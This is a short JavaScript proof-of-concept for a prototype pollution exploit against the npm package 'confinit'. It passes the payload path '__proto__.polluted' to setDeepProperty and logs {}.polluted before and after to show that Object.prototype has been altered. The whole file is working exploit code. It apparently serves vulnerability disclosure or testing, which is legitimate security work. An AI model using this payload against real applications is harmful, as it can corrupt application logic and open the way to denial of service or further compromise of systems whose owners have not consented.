var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
const root = require('confinit');
const payload = '__proto__.polluted';
console.log({}.polluted);
root.setDeepProperty(obj, payload, 'yes');
console.log({}.polluted);